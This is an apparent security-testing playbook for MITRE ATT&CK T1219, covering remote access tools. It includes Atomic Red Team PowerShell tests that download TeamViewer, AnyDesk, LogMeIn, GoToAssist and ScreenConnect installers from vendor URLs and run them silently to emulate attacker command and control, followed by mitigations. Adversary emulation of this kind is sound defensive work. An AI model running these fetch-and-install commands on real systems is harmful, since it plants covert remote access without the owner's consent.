---
name: "T1219_remote-access-tools"
description: "An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1219
  - command-and-control
  - linux
  - macos
  - windows
technique_id: "T1219"
tactic: "command-and-control"
all_tactics:
  - command-and-control
platforms:
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1219"
tech_stack:
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-300
chains_with:
  - T1219.001
  - T1219.002
  - T1219.003
prerequisites:
  []
severity_boost:
  T1219.001: "Chain with T1219.001 for deeper attack path"
  T1219.002: "Chain with T1219.002 for deeper attack path"
  T1219.003: "Chain with T1219.003 for deeper attack path"
---

# T1219 Remote Access Tools

## High-Level Description

An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line interface) allow a user to control a computer remotely as if they are a local user inheriting the user or software permissions. This software is commonly used for troubleshooting, software installation, and system management. Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.

Remote access tools may be installed and used post-compromise as an alternate communications channel for redundant access or to establish an interactive remote desktop session with the target system. It may also be used as a malware component to establish a reverse connection or back-connect to a service or adversary-controlled system.

Installation of many remote access tools may also include persistence (e.g., the software's installation routine creates a Windows Service). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome’s Remote Desktop).

## Kill Chain Phase

- Command and Control (TA0011)

**Platforms:** Linux, macOS, Windows

## What to Check

- [ ] Identify if Remote Access Tools technique is applicable to target environment
- [ ] Check Linux systems for indicators of Remote Access Tools
- [ ] Check macOS systems for indicators of Remote Access Tools
- [ ] Check Windows systems for indicators of Remote Access Tools
- [ ] Verify mitigations are bypassed or absent (5 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: TeamViewer Files Detected Test on Windows

An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe
$file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
Start-Process -Wait $file1 /S; 
Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'
```

### Atomic Test 2: AnyDesk Files Detected Test on Windows

An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe
$file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
Start-Process $file1 /S;
```

### Atomic Test 3: LogMeIn Files Detected Test on Windows

An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
$file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
Start-Process -Wait $file1 /quiet;
Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' "/S"
```

### Atomic Test 4: GoToAssist Files Detected Test on Windows

An adversary may attempt to trick the user into downloading GoToAssist and use to establish C2. Download of GoToAssist installer will be at the destination location and ran when sucessfully executed.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe "https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1"
$file1 = "C:\Users\" + $env:username + "\Downloads\GoToAssist.exe"
Start-Process $file1 /S;
```

### Atomic Test 5: ScreenConnect Application Download and Install on Windows

An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.
Msiexec will be used to quietly insall ScreenConnect.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
$installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
Invoke-WebRequest -OutFile $installer "https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_25.1.10.9197_Release.msi"
msiexec /i $installer /qn
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Remote Access Tools by examining the target platforms (Linux, macOS, Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1219 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1038 Execution Prevention
Use application control to mitigate installation and use of unapproved software that can be used for remote access.

### M1037 Filter Network Traffic
Properly configure firewalls, application firewalls, and proxies to limit outgoing traffic to sites and services used by remote access software.

### M1034 Limit Hardware Installation
Block the use of IP-based KVM devices within the network if they are not required.

### M1031 Network Intrusion Prevention
Network intrusion detection and prevention systems that use network signatures may be able to prevent traffic to remote access services.

### M1042 Disable or Remove Feature or Program
Consider disabling unnecessary remote connection functionality, including both unapproved software installations and specific features built into supported applications.


## Detection

### Behavior-Chain Detection for Remote Access Tools (Tool-Agnostic)


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Remote Access Tools technique applicable | Medium | Command And Control |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-300 | Channel Accessible by Non-Endpoint |


## References

- [CrowdStrike 2015 Global Threat Report](https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf)
- [CrySyS Blog TeamSpy](https://blog.crysys.hu/2013/03/teamspy/)
- [Google Chrome Remote Desktop](https://support.google.com/chrome/answer/1649523)
- [Chrome Remote Desktop](https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708)
- [Symantec Living off the Land](https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf)
- [Atomic Red Team - T1219](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1219)
- [MITRE ATT&CK - T1219](https://attack.mitre.org/techniques/T1219)
